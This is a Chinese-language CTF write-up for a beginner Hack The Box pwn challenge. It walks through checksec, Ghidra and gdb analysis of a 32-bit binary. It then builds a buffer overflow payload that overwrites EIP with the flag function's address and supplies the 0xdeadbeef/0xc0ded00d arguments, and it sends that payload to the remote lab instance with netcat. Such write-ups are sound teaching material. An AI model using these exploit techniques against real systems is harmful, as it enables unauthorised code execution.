这是一道入门的pwn题，入门可以看我写的那个pwn入门专栏，这里很多基础的东西都不解释了

题目网址：
```
https://app.hackthebox.com/challenges/you-know-0xdiablos
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/9955d5d38c3147d9940ba238a591aff1.png)

解压密码为hackthebox
# 文件信息收集
```
file vuln
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/3a41077e4ee84b2ba2373a67da6d568e.png)

这是一个32位的程序，动态链接的，没有开启内存随机化
```
checksec vuln
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/488a38c5134e49418436f133d0eceffc.png)

可以看到，这个程序什么防护都没开

从上到下依次是：
```
32位程序
部分RELRO，基本上所有程序都默认的有这个
没有开启栈保护
未启用数据执行
没有pie，意思是程序的内存空间不会被随机化
有读，写，和执行的段，意思是我们可以在程序里写入shellcode
```
# 静态分析
用ghidra打开程序，按下键盘的i键，选择程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/54a6b9e37d4a4f73addcb060ee949f45.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/98ce88bcbeaf43f1824d5138a1f0adcb.png)

双击启动，然后都是默认即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/d6e1dfc7972c4917a4dc7a2f3ca9e86e.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/5516fdeebf314db9ac2dacae1bb5b097.png)

然后找到main函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/8d3afcf7a1c94b9d9e880870760d910f.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/170e2001838749f49b3f2c6e4321d950.png)

```
main(void){
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```
程序很简单，输出一串字符串然后调用了vuln函数，我们双击vuln函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/588433a07c274a7e84f524c626c548ee.png)

这个函数的功能也很简单，获取了我们的输入，然后再输出

![在这里插入图片描述](https://img-blog.csdnimg.cn/4ee810e7eeaa426aa65b5ec8435f4cf8.png)

然后看看flag函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/5cc911c6f28d4d6f9ad79ab78abfc1e4.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/ff79773a193f4615b403cfa9a2a8ba93.png)


这个函数首先检查flag.txt文件在不在，然后对比两个字符串，如果对比通过就会输出flag文件里的内容

右击十六进制数就能看到对应字符串

程序很简单，只需要溢出覆盖即可，我们还需要创建一个flag.txt保证程序正常运行
```
echo "good" > flag.txt
```

# 动态调试

用gdb打开程序，在vuln函数的ret指令处下一个断点，方便看看溢出的偏移量

```
gdb vuln
info functions
```
记住flag函数地址，一会控制了eip指针就直接跳转到flag函数地址处

![在这里插入图片描述](https://img-blog.csdnimg.cn/8a1a90d8f1a64d899efb1d25b610ab9c.png)
```
0x080491e2
```
然后在vuln函数ret指令处下断点
```
disassemble vuln
b *0x080492b0
```
![**加粗样式**](https://img-blog.csdnimg.cn/346bce2d3b24428f973a924a9aa9c7e4.png)

运行程序，测试溢出的偏移量
```
cyclic 200
run
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b0036cc6399245fc95ec651b2e238a61.png)


查询waab字符的位置
```
cyclic -l waab
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1ac56f30a4fb45c087c6ff3b6b290e95.png)

我们需要188个字符就能控制eip寄存器

现在我们控制eip寄存器跳转到flag函数地址处
```
python2 -c "print 'A'*188+'\xe2\x91\x04\x08'" > test
```
然后返回gdb
```
r < test
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/7de70c2e73be4dd9b187490032382b6d.png)

可以看到，我们成功的跳转到了flag函数内执行代码，继续向下执行


![在这里插入图片描述](https://img-blog.csdnimg.cn/395c36fb07e6468eaabb20627b68d158.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/b1050606b1da4bc680b1e69534ed7049.png)

在ebp+8地址处和deadbeef字符做了对比，在ebp+0xc地址处和c0ded00d字符串做了对比，我们看看堆栈里的东西

```
x $ebp+0x8
x $ebp+0xc
x/50x $esp
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1f8d8fcec69e4c70a2fb580abbd44b94.png)

这两个地址存放的字符串前还需要覆盖4个垃圾字符才能使程序判断正确输出flag文件内的字符
# PWN
```
python2 -c "print 'A'*188+'\xe2\x91\x04\x08'+'AAAA'+'\xef\xbe\xad\xde'+'\x0d\xd0\xde\xc0'" > test
```
运行程序，将payload发送到里面
```
cat test - | ./vuln
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c82992a50d2c4a998c7611fdc5d6cb8d.png)

成功输出flag.txt里的内容，现在获得靶机的远程地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/6fee258f68a94f5dab6e9f773c8050f9.png)

直接打就是
```
cat test - | nc 167.99.89.94 31250
```
![**加粗样式**](https://img-blog.csdnimg.cn/13ba85ba3f184a94aa96d6999007bae3.png)

成功获得flag
